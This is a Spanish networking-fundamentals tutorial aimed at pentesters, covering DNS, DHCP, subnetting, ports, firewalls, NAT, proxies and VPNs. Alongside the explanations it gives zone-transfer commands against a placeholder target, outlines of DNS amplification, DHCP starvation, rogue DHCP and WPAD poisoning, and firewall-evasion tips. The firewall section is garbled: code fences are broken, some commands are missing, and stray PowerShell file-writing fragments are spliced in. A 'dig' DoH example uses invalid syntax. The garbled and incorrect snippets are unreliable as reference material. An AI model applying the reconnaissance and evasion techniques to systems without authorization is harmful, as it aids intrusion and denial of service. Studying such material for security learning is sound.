example.com.  86400  IN  CAA  0 issue "letsencrypt.org"
example.com.  86400  IN  CAA  0 iodef "mailto:security@example.com"
```
- Define qué CAs pueden emitir certificados para el dominio.
- `issue`: solo la CA listada puede emitir.
- `issuewild`: solo la CA listada puede emitir wildcard.
- `iodef`: URL para reportar violaciones.
- Las CA DEBEN verificar CAA antes de emitir (desde 2017).

**DNSSEC Records (DS, DNSKEY, RRSIG, NSEC):**
- **DNSKEY:** Clave pública del dominio (ZSK y KSK).
- **DS:** Hash de la DNSKEY del hijo, guardado en el padre.
- **RRSIG:** Firma para cada RRSET (conjunto de records del mismo tipo y nombre).
- **NSEC/NSEC3:** Prueba de inexistencia (un record NSEC te dice qué records existen en orden).
- **NSEC3:** NSEC con hashing, previene zone walking.

### [proceso](../raw/0s-f0nd4m3nt0s.md#procesos) de Resolución DNS — En detalle

Cuando hacés `nslookup google.com` desde tu máquina:

1. **Stub Resolver** (tu máquina) pregunta al **Resolver Recursivo** configurado (ej: 8.8.8.8):
   - "¿Cuál es la IP de google.com?"

2. **Resolver Recursivo (8.8.8.8)** hace:
   - Consulta al **Root Server**: "¿IP de google.com?"
   - El Root responde: referral a .com TLD (con IPs de a.gtld-servers.net)
   - Consulta a **gtld-servers.net**: "¿IP de google.com?"
   - El TLD responde: referral a ns1.google.com, ns2.google.com, ns3.google.com
   - Consulta a **ns1.google.com** (Authoritative): "¿IP de google.com?"
   - El Authoritative responde: "google.com = 142.250.184.78" (A record) + TTL

3. El **Resolver Recursivo** devuelve la IP al **Stub Resolver**.

4. El **Stub Resolver** la pasa a la aplicación (curl, [navegador](../raw/br0ws3r-3xpl01t4t10n.md)).

### DNS Caching y TTL

Cada nivel puede cachear los resultados DNS. Esto acelera la resolución pero puede envenenarse.

**Caches DNS:**
- **Browser cache:** Chrome: chrome://net-internals/#dns, Firefox: network.dnsCacheExpiration
- **OS cache (stub resolver):** systemd-resolved, dnscache (Windows)
- **Resolver cache:** 8.8.8.8, 1.1.1.1 (no podés flushearla directamente)
- **Local DNS cache:** dnsmasq, pi-hole, routers
- **CDN cache:** Akamai, Cloudflare (caché de edge, no DNS)

**Comandos para gestionar cache DNS:**
```bash
# Windows - Ver y limpiar cache
ipconfig /displaydns
ipconfig /flushdns

# Linux (systemd-resolved)
resolvectl statistics  # ver estadísticas
resolvectl flush-caches  # limpiar cache

# Linux (dnsmasq)
systemctl restart dnsmasq  # o killall -HUP dnsmasq

# macOS
sudo killall -HUP mDNSResponder  # limpiar cache
```

**TTL (Time To Live):**
- Cuánto tiempo un record DNS se puede cachear (en segundos).
- TTL bajos (30-300): útil para load balancing, failover, cambios frecuentes.
- TTL altos (86400+): reduce carga en servidores DNS.
- **Pentester:** TTL bajo ayuda a que cambios (como DNS spoofing) se propaguen rápido.
- **NXDOMAIN TTL:** El SOA minimum TTL se usa como TTL para respuestas negativas.

### DNS Flood / Amplification

**DNS Amplification Attack:**
- El atacante envía consultas DNS con source IP falsificada (IP de la víctima)
- El servidor DNS responde a la víctima con una respuesta mucho más grande que la consulta
- Factor de amplificación: hasta 50-60x (consulta 60 bytes, respuesta 3000+ con DNSSEC)
- `dig ANY isc.org @8.8.8.8` genera una respuesta grande
- Se mitiga con: BCP 38 (anti-spoofing), [rate limiting](../raw/4p1-s3cur1ty.md#rate-limiting), respuesta mínima por defecto

**DNS Flood (DoS):**
- Enviar millones de consultas DNS a un servidor
- Agota CPU y ancho de banda del servidor
- Diferente de amplification: el objetivo es el servidor DNS, no la víctima

### DNS sobre [https](../raw/r3d3s-f0nd4m3nt0s.md#https) (DoH) y DNS sobre TLS (DoT)

**DNS normal:** En texto plano. Cualquiera en el medio puede ver qué dominios estás consultando.

**DoT (DNS over TLS, RFC 7858):**
- Puerto 853, TCP
- DNS envuelto en TLS (cifra consulta y respuesta)
- El puerto 853 es visible (un [firewall](../raw/s3c-f0nd4m3nt0s.md#firewalls) sabe que estás usando DoT)
- Fácil de bloquear por el puerto

**DoH (DNS over HTTPS, RFC 8484):**
- Puerto 443, HTTPS
- DNS envuelto en [http](../raw/r3d3s-f0nd4m3nt0s.md#http)/2 (indistinguible del tráfico web normal)
- Más difícil de bloquear (parece HTTPS normal)
- Más overhead que DoT (HTTP + TLS)
- El resolver tiene que estar configurado como URL HTTPS

**DoH Resolvers públicos:**
- Cloudflare: https://cloudflare-dns.com/dns-query
- Google: https://dns.google/dns-query
- Quad9: https://dns.quad9.net/dns-query

```bash
# Consulta DoH con curl
curl -H "accept: application/dns-json" "https://cloudflare-dns.com/dns-query?name=google.com&type=A"
```

**Para el pentester:**
- DoH puede bypassear DNS filtering corporativo (el tráfico parece HTTPS normal)
- Algunos malware usan DoH para resolver [c2](../raw/r3v3rs3-sh3lls.md#command-and-control) (difícil de bloquear)
- DoT es más fácil de bloquear (puerto 853 visible)
- DoH también se usa para bypassear censura (Great Firewall de China bloquea DoH)

### DNS Commands — nslookup, dig, host

#### nslookup

```bash
# Consulta básica (usa el resolver del sistema)
nslookup google.com

# Consulta con servidor DNS específico
nslookup google.com 8.8.8.8

# Consultar tipo específico
nslookup -type=mx google.com
nslookup -type=any google.com
nslookup -type=soa google.com
nslookup -type=ns google.com
nslookup -type=txt google.com
nslookup -type=aaaa google.com

# Reverse lookup
nslookup 142.250.184.78

# Modo interactivo (escribís nslookup y después comandos)
nslookup
> set type=any
> google.com
> exit
```

#### dig (Domain Information Groper)

La herramienta definitiva de DNS. Mucho más poderosa que nslookup.

```bash
# Consulta básica (A record)
dig google.com

# Consulta específica de tipo
dig google.com A
dig google.com AAAA
dig google.com MX
dig google.com NS
dig google.com TXT
dig google.com SOA
dig google.com CNAME
dig google.com ANY  # deprecated, pero útil

# Consulta a un servidor específico
dig @8.8.8.8 google.com

# Reverse DNS
dig -x 142.250.184.78

# Short output (solo IPs)
dig +short google.com
dig +short MX google.com

# Trace completo (muestra root -> TLD -> authoritative)
dig +trace google.com

# Con todos los detalles (por defecto)
dig +all google.com

# Sin secciones adicionales
dig +noadditional google.com

# DNS over HTTPS
dig @https://cloudflare-dns.com/dns-query google.com

# Consulta DNSSEC
dig +dnssec google.com

# Bind format (formato de zona)
dig google.com AXFR  # transferencia de zona si está permitida

# Mostrar solo el tiempo de respuesta
dig +stats google.com
```

#### host

Herramienta simple para consultas DNS.

```bash
host google.com
host -a google.com  # all records
host -t mx google.com
host -t ns google.com
host -t txt google.com
host -t soa google.com
host google.com 8.8.8.8  # con servidor específico
host 142.250.184.78  # reverse lookup
```

### Zone Transfers (AXFR, IXFR)

**AXFR (Full Zone Transfer):** Transferencia completa de la zona DNS (todos los records) del servidor primario al secundario.

**IXFR (Incremental Zone Transfer):** Solo los cambios desde un serial específico.

**Para el pentester:**
Si un servidor DNS está mal configurado y permite AXFR desde cualquier IP, podés obtener TODOS los records del dominio: subdominios, IPs internas, servidores de mail, etc.

```bash
# Probar AXFR con dig
dig @ns1.target.com target.com AXFR

# Probar con host
host -l target.com ns1.target.com

# Probar con nslookup
nslookup
> server ns1.target.com
> ls -d target.com
```

**Cómo prevenirlo:**
- Permitir AXFR solo desde IPs secundarias autorizadas
- Usar TSIG (Transaction Signature) para autenticar transferencias
- Dividir DNS: vista interna y externa

**Enumera tools DNS:**
- `dnsrecon`: Escaneo DNS completo
- `dnsenum`: Enumeración automática
- `fierce`: Enumeración de subdominios por [fuerza bruta](../raw/p4ssw0rd-4tt4cks.md#fuerza-bruta)
- `subfinder`: Encuentra subdominios por múltiples fuentes (pasivo)
- `amass`: El más completo ([owasp](../raw/w3b-h4ck1ng.md#owasp-top-10))

---

## [dhcp](../raw/r3d3s-f0nd4m3nt0s.md#dhcp)

### ¿Qué es DHCP?

DHCP (Dynamic Host Configuration Protocol) asigna automáticamente configuraciones de [red](../raw/r3d3s-f0nd4m3nt0s.md) a los hosts. [ip](../raw/r3d3s-f0nd4m3nt0s.md#direccionamiento-ip), máscara, gateway, [dns](../raw/r3d3s-f0nd4m3nt0s.md#dns), etc.

Opera en capa 7 (aplicación), pero en el modelo [tcp/ip](../raw/r3d3s-f0nd4m3nt0s.md#tcp-ip) está en la capa de aplicación. Usa [udp](../raw/r3d3s-f0nd4m3nt0s.md#udp): [puerto](../raw/r3d3s-f0nd4m3nt0s.md#puertos) 67 (servidor) y 68 (cliente).

### DORA (Discover, Offer, Request, ACK)

El [proceso](../raw/0s-f0nd4m3nt0s.md#procesos) de 4 pasos para obtener una IP:

**1. DISCOVER (Cliente -> Broadcast)**
- El cliente no tiene IP. Envía un DHCPDISCOVER a 255.255.255.255:67
- MAC origen: la del cliente. MAC destino: FF:FF:FF:FF:FF:FF
- Opciones: Client ID (MAC), Parameter Request List (qué opciones quiere)

**2. OFFER (Servidor -> Broadcast/Unicast)**
- El servidor responde con DHCPOFFER
- Ofrece: IP disponible, máscara, gateway, DNS, lease time
- La IP se marca como "ofrecida" temporalmente

**3. REQUEST (Cliente -> Broadcast)**
- El cliente acepta la oferta enviando DHCPREQUEST (broadcast para que todos los servidores sepan cuál IP aceptó)
- Requested IP: la que aceptó
- Server Identifier: el servidor que eligió

**4. ACK (Servidor -> Broadcast/Unicast)**
- El servidor confirma con DHCPACK
- Incluye la configuración completa (IP, máscara, gateway, DNS, lease time)
- El cliente aplica la configuración

**Esquema DORA:**
```
CLIENTE                     SERVIDOR DHCP
   |                           |
   |--- DHCPDISCOVER (broad) ->|
   |                           |
   |<-- DHCPOFFER -------------|
   |                           |
   |--- DHCPREQUEST (broad) -->|
   |                           |
   |<-- DHCPACK ---------------|
   |                           |
   |==== IP CONFIGURADA =======|
```

**Otros mensajes DHCP:**
- **DHCPNAK:** El servidor rechaza la configuración solicitada
- **DHCPDECLINE:** El cliente detecta que la IP ya está en uso ([arp](../raw/r3d3s-f0nd4m3nt0s.md#arp) probe) y la rechaza
- **DHCPRELEASE:** El cliente libera la IP
- **DHCPINFORM:** El cliente ya tiene IP pero pide más opciones (muy usado en [redes](../raw/r3d3s-f0nd4m3nt0s.md) con autenticación)

### DHCP Options (el detalle)

Cada mensaje DHCP puede incluir opciones en el campo Options. Las más importantes:

| Code | Opción | Descripción |
|------|--------|-------------|
| 1 | Subnet Mask | Máscara de [subred](../raw/r3d3s-f0nd4m3nt0s.md#subredes) (obligatoria) |
| 3 | [router](../raw/r3d3s-f0nd4m3nt0s.md#routers) | Gateway por defecto |
| 6 | Domain Name Server | DNS servers |
| 12 | Host Name | Nombre del host |
| 15 | Domain Name | Dominio de la red (ej: ejemplo.[com](../raw/w1n-s9bsyst3ms.md#com).ar) |
| 28 | Broadcast Address | Dirección de broadcast |
| 42 | NTP Server | Servidor NTP |
| 50 | Requested IP | IP solicitada por el cliente |
| 51 | IP Address Lease Time | Tiempo de lease en segundos |
| 53 | DHCP Message Type | 1=Discover, 2=Offer, 3=Request, 4=Decline, 5=ACK, 6=NAK, 7=Release, 8=Inform |
| 54 | Server Identifier | IP del servidor DHCP |
| 55 | Parameter Request List | Lista de opciones que el cliente solicita |
| 58 | Renewal Time (T1) | Cuándo renovar (50% del lease) |
| 59 | Rebinding Time (T2) | Cuándo rebind (87.5% del lease) |
| 60 | Vendor Class Identifier | Identificador del fabricante/del cliente (ej: "MSFT 5.0") |
| 61 | Client Identifier | ID del cliente (generalmente la MAC) |
| 66 | TFTP Server Name | Para PXE boot |
| 67 | Bootfile Name | Archivo de boot (PXE) |
| 77 | User Class | Clase de usuario (diferenciación de servicio) |
| 114 | CAPWAP AC | Control And Provisioning of Wireless Access Points |
| 119 | Domain Search | Lista de búsqueda de dominio (resolución sin FQDN) |
| 121 | Classless Static Route | Rutas estáticas (formato CIDR) |
| 150 | TFTP Server (Cisco) | Para Cisco IP Phones |

**Lease Time (Tiempo de concesión):**
- Tiempo durante el cual el cliente puede usar la IP (típico: 24 horas)
- T1 (Renewal): 50% del lease -> intenta renovar con el mismo servidor (unicast)
- T2 (Rebinding): 87.5% del lease -> si no renovó, busca cualquier servidor (broadcast)
- Si el lease expira sin renovar, el cliente debe dejar la IP

**Para el pentester:**
- **DHCP starvation:** agotar el pool de [ips](../raw/s3c-f0nd4m3nt0s.md#ids-ips) enviando muchos DHCPDISCOVER con MACs falsas.
- **Rogue DHCP server:** poner un servidor DHCP falso en la red para asignar IPs con gateway controlado por el atacante ([mitm](../raw/m1tm-m0b1l3.md)).
- **DHCP fingerprint:** el Vendor Class Identifier (opción 60) revela qué SO/cliente es.
- **WPAD poisoning:** [responder](../raw/w1nd0ws-p0st3xpl01t.md#responder) DHCP con opción 252 (WPAD) apuntando a un [proxy](../raw/r3d3s-f0nd4m3nt0s.md#proxy) malicioso.
- **DNS poisoning via DHCP:** opción 6 (DNS) puede apuntar a un servidor DNS malicioso.

Herramientas: `yersinia` (DHCP starvation), `dhcpstarv`, `mitm6` (IPv6 + DHCPv6 poisoning), `bettercap` (DHCP spoofing).

### Static vs Dynamic IP

| Característica | IP Estática | IP Dinámica (DHCP) |
|---------------|-------------|--------------------|
| Configuración | Manual | Automática |
| Consistencia | Siempre la misma IP | Puede cambiar con cada lease |
| Administración | Registro manual | Pool de DHCP |
| Seguridad | Más fácil de auditar | Más fácil de robar (IP spoofing) |
| Movilidad | Mala (cambiar de red implica reconfigurar) | Buena (se adapta automáticamente) |
| Uso típico | Servidores, impresoras, routers | Clientes, laptops, móviles |

---
## Subnetting y CIDR

### Que es Subnetting?

Subnetting es dividir una [red](../raw/r3d3s-f0nd4m3nt0s.md) grande en subredes mas pequenas. Permite mejor gestion del espacio de direcciones, reducir trafico broadcast, y aislar segmentos de [red](../raw/r3d3s-f0nd4m3nt0s.md) por seguridad.

### [ip](../raw/r3d3s-f0nd4m3nt0s.md#direccionamiento-ip) Classes ([legacy](../raw/l3g4cy-3nt3rpr1s3.md))

Originalmente las [ips](../raw/s3c-f0nd4m3nt0s.md#ids-ips) se dividian en clases:

| Clase | Rango | Bits red | Mascara | Hosts |
|-------|-------|----------|---------|-------|
| A | 0.0.0.0 - 127.255.255.255 | 0... | /8 | 16,777,214 |
| B | 128.0.0.0 - 191.255.255.255 | 10.. | /16 | 65,534 |
| C | 192.0.0.0 - 223.255.255.255 | 110. | /24 | 254 |
| D | 224.0.0.0 - 239.255.255.255 | 1110 | Multicast | N/A |
| E | 240.0.0.0 - 255.255.255.255 | 1111 | Experimental | N/A |

**Problema:** desperdicio masivo. Por eso se creo CIDR en 1993.

### CIDR (Classless Inter-Domain Routing)

Notacion: IP/prefix donde prefix = cantidad de bits de red.

| CIDR | Mascara | Hosts utiles |
|------|---------|--------------|
| /24 | 255.255.255.0 | 254 |
| /25 | 255.255.255.128 | 126 |
| /26 | 255.255.255.192 | 62 |
| /27 | 255.255.255.224 | 30 |
| /28 | 255.255.255.240 | 14 |
| /29 | 255.255.255.248 | 6 |
| /30 | 255.255.255.252 | 2 |
| /16 | 255.255.0.0 | 65,534 |
| /8 | 255.0.0.0 | 16,777,214 |

**Formula:** Hosts utiles = 2^(32 - prefix) - 2
El -2 descuenta network address (todo 0s) y broadcast (todo 1s).

### Network, Broadcast, Hosts Utiles

**Network Address:** Primera IP del rango (bits de host en 0). No asignable.
**Broadcast Address:** Ultima IP del rango (bits de host en 1). No asignable.
**Usable Hosts:** Todas entre network y broadcast.

**Ejemplo 192.168.1.0/26:**
- Network: 192.168.1.0
- Broadcast: 192.168.1.63
- Hosts: .1 a .62 (62 hosts)
- Proxima [subred](../raw/r3d3s-f0nd4m3nt0s.md#subredes): 192.168.1.64/26

### VLSM ([variable](../raw/pr0gr4mm1ng-f0nd4m3nt0s.md#variables) Length Subnet Mask)

VLSM permite usar mascaras de distinto tamano en la misma red.
Ej: 192.168.1.0/24 dividido en:
- /27 (30 hosts) -> 192.168.1.0/27
- /28 (14 hosts) -> 192.168.1.32/28
- /29 (6 hosts)  -> 192.168.1.48/29
- /30 (2 hosts)  -> 192.168.1.56/30

### Supernetting

Combinar [redes](../raw/r3d3s-f0nd4m3nt0s.md) contiguas en una sola: 192.168.0.0/24 + 192.168.1.0/24 + 192.168.2.0/24 + 192.168.3.0/24 = 192.168.0.0/22
Usado en [bGP](../raw/r3d3s-4v4nz4d4s.md#bgp) para reducir tablas de ruteo.

---

## Sockets y Puertos

### Que es un [puerto](../raw/r3d3s-f0nd4m3nt0s.md#puertos)?

Un puerto es un numero de 16 bits (0-65535) que identifica una aplicacion en un host.
Puerto + [ip](../raw/r3d3s-f0nd4m3nt0s.md#direccionamiento-ip) = **socket** (direccion completa de comunicacion).

### Rangos de Puertos

| Rango | Categoria | Descripcion |
|-------|-----------|-------------|
| 0-1023 | Well-Known | Servicios conocidos (root req) |
| 1024-49151 | Registered | Asignados por IANA |
| 49152-65535 | Dynamic | Puertos origen efimeros |

### Tipos de Socket

**Socket [tcp](../raw/r3d3s-f0nd4m3nt0s.md#tcp) (Stream):** Orientado a conexion, confiable. socket(AF_INET, SOCK_STREAM, 0)
**Socket [udp](../raw/r3d3s-f0nd4m3nt0s.md#udp) (Datagram):** Sin conexion, no confiable. socket(AF_INET, SOCK_DGRAM, 0)
**Socket Raw:** Acceso a capa inferior. Permite construir paquetes custom. Requiere root.
**Socket Unix Domain:** IPC local (no pasa por [red](../raw/r3d3s-f0nd4m3nt0s.md)). /var/run/[docker](../raw/d0ck3r-f0r-h4ck3rs.md).sock

### Modelo Cliente-Servidor

Servidor: socket() -> bind() -> listen() -> accept() -> recv()/send() -> close()
Cliente:  socket() -> connect() -> send()/recv() -> close()

**bind():** asigna IP y puerto al socket. 0.0.0.0 = todas las interfaces.
**listen():** pone el socket en modo pasivo (servidor).
**accept():** bloquea hasta que llega una conexion, devuelve socket nuevo.

### Tabla de Puertos Comunes

| Puerto | Servicio | Uso en pentesting |
|--------|----------|-------------------|
| 20/21 | FTP | Banner grabbing, anonymous login |
| 22 | SSH | Acceso remoto, tunelizacion |
| 23 | Telnet | Texto plano, banner |
| 25 | SMTP | Open relay, enumeracion |
| 53 | [dns](../raw/r3d3s-f0nd4m3nt0s.md#dns) | Zone transfer, poisoning |
| 69 | TFTP | Sin auth, descarga archivos |
| 80 | [http](../raw/r3d3s-f0nd4m3nt0s.md#http) | Web server |
| 88 | Kerberos | [autenticacion](../raw/s3c-f0nd4m3nt0s.md#autenticacion) [ad](../raw/w1nd0ws-d0m41n-4dm1n.md) |
| 110 | POP3 | Email texto plano |
| 111 | [rpc](../raw/w1n-s9bsyst3ms.md#rpc) | Portmapper, [rpc](../raw/w1n-s9bsyst3ms.md#rpc) info |
| 123 | NTP | Amplification DDoS |
| 135 | RPC EPMAP | Endpoint Mapper Windows |
| 137/139 | NetBIOS | [legacy](../raw/l3g4cy-3nt3rpr1s3.md) Windows |
| 143 | IMAP | Email |
| 161 | SNMP | Community strings |
| 389 | LDAP | Directorio, injection |
| 443 | [https](../raw/r3d3s-f0nd4m3nt0s.md#https) | Web seguro |
| 445 | [smb](../raw/w1nd0ws-p0st3xpl01t.md#smb) | EternalBlue, [rce](../raw/w3b-h4ck1ng.md#rce) |
| 500 | IKE/IPSec | [vpn](../raw/4n0n1m4t0.md#vpn) |
| 514 | Syslog | Logs |
| 636 | LDAPS | LDAP sobre [ssl](../raw/r3d3s-f0nd4m3nt0s.md#ssl-tls)) |
| 993 | IMAPS | IMAP SSL |
| 995 | POP3S | POP3 SSL |
| 1080 | SOCKS | [proxy](../raw/r3d3s-f0nd4m3nt0s.md#proxy) |
| 1194 | OpenVPN | VPN |
| 1433 | MSSQL | xp_cmdshell RCE |
| 1521 | Oracle | TNS listener |
| 1723 | PPTP | VPN insegura |
| 2049 | NFS | File system remoto |
| 2375 | Docker | API sin [tls](../raw/r3d3s-f0nd4m3nt0s.md#ssl-tls) |
| 3128 | Squid | Proxy HTTP |
| 3306 | MySQL | [sqli](../raw/w3b-h4ck1ng.md#sql-injection) |
| 3389 | RDP | BlueKeep, RCE |
| 5432 | PostgreSQL | DB |
| 5800/5900 | VNC | Remote desktop |
| 5985/5986 | WinRM | Remote Management |
| 6379 | Redis | RCE via [cron](../raw/l1n9x-pr1v3sc.md#cron-jobs) |
| 6443 | [k8s](../raw/k8s-d33p-d1v3.md) API | [kubernetes](../raw/k8s-d33p-d1v3.md) |
| 8080 | HTTP alt | Proxy/alternativo |
| 8443 | HTTPS alt | Alternativo |
| 9200 | Elasticsearch | API sin auth |
| 11211 | Memcached | Amplification |
| 27017 | MongoDB | Sin auth |

---

## Firewalls y [nat](../raw/r3d3s-f0nd4m3nt0s.md#nat)

### Firewalls

Los firewalls controlan el trafico de [red](../raw/r3d3s-f0nd4m3nt0s.md) basado en reglas.

#### Stateless (sin estado)
Examina cada paquete independientemente. Reglas por [ip](../raw/r3d3s-f0nd4m3nt0s.md#direccionamiento-ip), [puerto](../raw/r3d3s-f0nd4m3nt0s.md#puertos), [protocolo](../raw/r3d3s-f0nd4m3nt0s.md#protocolos-de-red). Rapido pero facil de bypassear.

#### Stateful (con estado)
Mantiene tabla de conexiones activas (state table). Recuerda handshakes, secuencias. Permite trafico de respuesta automaticamente. Detecta paquetes fuera de contexto (ACK sin SYN).

Ejemplo de state table:
| Proto | Src IP | Src Port | Dst IP | Dst Port | State |
|-------|--------|----------|--------|----------|-------|
| [tcp](../raw/r3d3s-f0nd4m3nt0s.md#tcp) | 192.168.1.5 | 54321 | 8.8.8.8 | 53 | ESTABLISHED |
| [udp](../raw/r3d3s-f0nd4m3nt0s.md#udp) | 192.168.1.5 | 54322 | 8.8.8.8 | 53 | ACTIVE |

#### iptables/nftables (Linux)

**Estructura iptables:**
- Tables: filter (default), nat, mangle, raw, security
- Chains: INPUT (paquetes entrantes), OUTPUT (salientes), FORWARD (reenviados)
- En nat: PREROUTING (antes de rutear), POSTROUTING (despues de rutear)
- Rules: match + target (ACCEPT, DROP, REJECT, LOG, REDIRECT)

`ash
# Bloquear SSH de cualquier origen
iptables -A INPUT -p tcp --dport 22 -j DROP

# Permitir SSH solo de red local
iptables -A INPUT -p tcp --dport 22 -s 192.168.1.0/24 -j ACCEPT

# Permitir conexiones establecidas
iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT

# Redirigir puerto 8080 a 80 (NAT)
iptables -t nat -A PREROUTING -p tcp --dport 8080 -j REDIRECT --to-port 80

# Rechazar con mensaje ICMP
iptables -A INPUT -p tcp --dport 23 -j REJECT --reject-with icmp-port-unreachable

#### Windows [firewall](../raw/s3c-f0nd4m3nt0s.md#firewalls)

`ash
# Ver todas las reglas
netsh advfirewall firewall show rule name=all

# Bloquear puerto 445 entrante

# Permitir programa

# Activar/desactivar firewall
netsh advfirewall [set](../raw/ph1sh1ng.md#social-engineering-toolkit) allprofiles state on
netsh advfirewall set allprofiles state off
`" -Encoding utf8
Add-Content -Path G:\Proyectos\10)[forense](../raw/w1n-f0r3ns1cs.md#forense)\docs\tutoriales\r3d3s-f0nd4m3nt0s.md -Value " -Encoding utf8
Add-Content -Path G:\Proyectos\10)forense\docs\tutoriales\r3d3s-f0nd4m3nt0s.md -Value 

- **Fragmentacion:** dividir paquetes para evadir deteccion
- **Decoys:** [nmap](../raw/nm4p.md) -D (falsas [ips](../raw/s3c-f0nd4m3nt0s.md#ids-ips) origen)
- **Source port manipulation:** usar puerto 53 o 80 como origen
- **Timing:** escaneo lento (nmap -T0 o -T1)
- **MTU manipulation:** usar MTU chica (nmap --mtu 32)
- **Protocolos alternativos:** ICMP tunnel, [dns](../raw/r3d3s-f0nd4m3nt0s.md#dns) tunnel
- **[reverse shell](../raw/r3v3rs3-sh3lls.md#reverse-shells):** salir por puertos permitidos (80, 443, 53)
- **Port knocking:** secuencia de puertos para abrir regla

### NAT (Network Address Translation)

NAT traduce direcciones IP entre [redes](../raw/r3d3s-f0nd4m3nt0s.md). Permite que multiples dispositivos compartan una IP publica.

**SNAT (Source NAT):** Cambia IP origen de paquetes salientes.
  192.168.1.5:54321 -> IP_publica:30001

**DNAT (Destination NAT):** Cambia IP destino de paquetes entrantes (port forwarding).
  IP_publica:80 -> 192.168.1.10:80

**PAT (Port Address Translation):** SNAT con puertos diferentes para cada host.
  192.168.1.5:54321 -> IP_pub:30001
  192.168.1.6:54321 -> IP_pub:30002

**Port Forwarding:** Redirigir puerto publico a IP interna.
  [router](../raw/r3d3s-f0nd4m3nt0s.md#routers): IP_pub:80 -> 192.168.1.10:80

**En pentesting:**
- NAT bypass: si estas dentro de la red, evitas NAT
- NAT traversal: STUN, TURN, ICE para P2P/VoIP
- NAT Slipstreaming: ataque que abre puertos en NAT via manip de paquetes
- UDP NAT: el NAT debe adivinar el estado (UDP no tiene estados)

---

---

## [proxy](../raw/r3d3s-f0nd4m3nt0s.md#proxy) y [vpn](../raw/4n0n1m4t0.md#vpn)

### Proxy

Un proxy es un intermediario entre el cliente y el servidor.

#### Forward Proxy
El proxy representa al cliente. El cliente envia requests al proxy, el proxy los reenvia al destino.
- Usos: filtrado de contenido, cache, [anonimato](../raw/4n0n1m4t0.md), bypass de censura
- Ej: Squid, [burp suite](../raw/w3b-h4ck1ng.md#burp-suite) (intercepting proxy)

#### Reverse Proxy
El proxy representa al servidor. El cliente cree que habla con el servidor real, pero habla con el proxy.
- Usos: load balancing, caching, seguridad (oculta servidores internos)
- Ej: nginx, HAProxy, Cloudflare, [aws](../raw/cl0ud-h4ck1ng.md#aws) CloudFront

#### SOCKS4 vs SOCKS5 vs [http](../raw/r3d3s-f0nd4m3nt0s.md#http) Proxy

**HTTP Proxy:** Solo entiende HTTP. Hace requests HTTP. No soporta otros protocolos.
- Metodo CONNECT para tunelizar [https](../raw/r3d3s-f0nd4m3nt0s.md#https) ([tcp](../raw/r3d3s-f0nd4m3nt0s.md#tcp) forwarding)

**SOCKS4:** Proxy generico (no solo HTTP). Soporta TCP. No requiere [autenticacion](../raw/s3c-f0nd4m3nt0s.md#autenticacion).
- No soporta [udp](../raw/r3d3s-f0nd4m3nt0s.md#udp) ni resolucion remota de [dns](../raw/r3d3s-f0nd4m3nt0s.md#dns)

**SOCKS5:** Version mejorada.
- Soporta TCP y UDP
- Soporta autenticacion (username/password, GSS-API)
- Soporta resolucion DNS remota (el proxy resuelve, no el cliente)
- IPv6 support

**Transparent Proxy:** Proxy que no requiere configuracion del cliente. Intercepta el trafico en la [red](../raw/r3d3s-f0nd4m3nt0s.md).
- El [router](../raw/r3d3s-f0nd4m3nt0s.md#routers) redirige el trafico 80/443 al proxy sin que el cliente lo sepa
- Usado en corporaciones, hotspots, captive portals
- Identificable porque el cliente ve direcciones [ip](../raw/r3d3s-f0nd4m3nt0s.md#direccionamiento-ip) privadas o respuestas de bloqueo

#### [proxychains](../raw/4n0n1m4t0.md#proxychains)

Proxychains fuerza cualquier aplicacion a usar uno o mas proxies.

```bash
# Config: /etc/proxychains.conf
# Tipos: http, socks4, socks5

# Uso basico
proxychains nmap -sT -Pn target.com
proxychains curl http://target/

# Escaneo a traves de SOCKS5
proxychains4 nmap -sT -Pn -p 80,443 target.com
```

**Modos de proxychains:**
- **strict_chain:** sigue el orden exacto de la lista
- **dynamic_chain:** salta proxies caidos, sigue con los siguientes
- **random_chain:** usa un proxy aleatorio de la lista cada vez
- **round_robin:** alterna entre proxies en orden

### VPN (Virtual Private Network)

Una VPN extiende una red privada a traves de una red publica (Internet). Cifra y tuneliza el trafico.

#### Site-to-Site VPN
Conecta [redes](../raw/r3d3s-f0nd4m3nt0s.md) enteras (oficinas, sucursales) a traves de Internet.
- Los routers de cada extremo manejan el tunel
- Los usuarios no notan la VPN (es transparente)
- Protocolos: IPSec, MPLS, GRE-over-IPSec

#### Remote Access VPN
Un usuario se conecta desde afuera a la red corporativa.
- Cliente VPN en la laptop del empleado
- Protocolos: OpenVPN, WireGuard, IPSec (IKEv2), PPTP, L2TP/IPSec, [ssl](../raw/r3d3s-f0nd4m3nt0s.md#ssl-tls)) VPN

#### SSL VPN
VPN que corre sobre HTTPS. No requiere cliente (se accede por [navegador](../raw/br0ws3r-3xpl01t4t10n.md)).
- Portal VPN: el usuario se loguea en una pagina web y accede a recursos internos
- Ej: Palo Alto GlobalProtect, Cisco AnyConnect, OpenVPN en modo TCP 443
- Dificil de bloquear (parece HTTPS normal)

#### IPSec (Internet Protocol Security)
Suite de protocolos para cifrar y autenticar paquetes IP.

**Modos:**
- **Transport mode:** solo cifra el [payload](../raw/m3t4spl01t.md#payloads) (no el header IP). Usado entre hosts.
- **Tunnel mode:** cifra TODO el paquete IP (header incluido). Usado entre gateways.

**Protocolos IPSec:**
- **AH (Authentication Header, proto 51):** Integridad y autenticacion, NO cifra.
- **ESP (Encapsulating Security Payload, proto 50):** Cifra y autentica.
- **IKE (Internet Key Exchange, UDP 500):** Negocia claves y SA (Security Associations).

**IKEv1 vs IKEv2:**
- IKEv1: mas complejo, modos Main y Aggressive. Aggressive mode revela el ID del usuario (peligroso).
- IKEv2: mas simple, mas rapido, soporta movilidad (MOBIKE), resistente a [nat](../raw/r3d3s-f0nd4m3nt0s.md#nat) traversal.

#### WireGuard
VPN moderna, simple y rapida. Corre sobre UDP.
- Un solo [puerto](../raw/r3d3s-f0nd4m3nt0s.md#puertos) (51820 UDP por defecto)
- [criptografia](../raw/crypt0-f0r-h4ck3rs.md): Curve25519, BLAKE2s, ChaCha20-Poly1305
- Sin estado: cada peer tiene una clave publica y una o mas [ips](../raw/s3c-f0nd4m3nt0s.md#ids-ips) permitidas
- Noise protocol framework
- Incluido en el [kernel](../raw/0s-f0nd4m3nt0s.md#kernel) de Linux desde 5.6

```bash
# Configuracion basica WireGuard
# Servidor: /etc/wireguard/wg0.conf
[Interface]
Address = 10.0.0.1/24
PrivateKey = <servidor_private_key>
ListenPort = 51820

[Peer]
PublicKey = <cliente_public_key>
AllowedIPs = 10.0.0.2/32
```

#### OpenVPN
VPN madura y ampliamente usada.
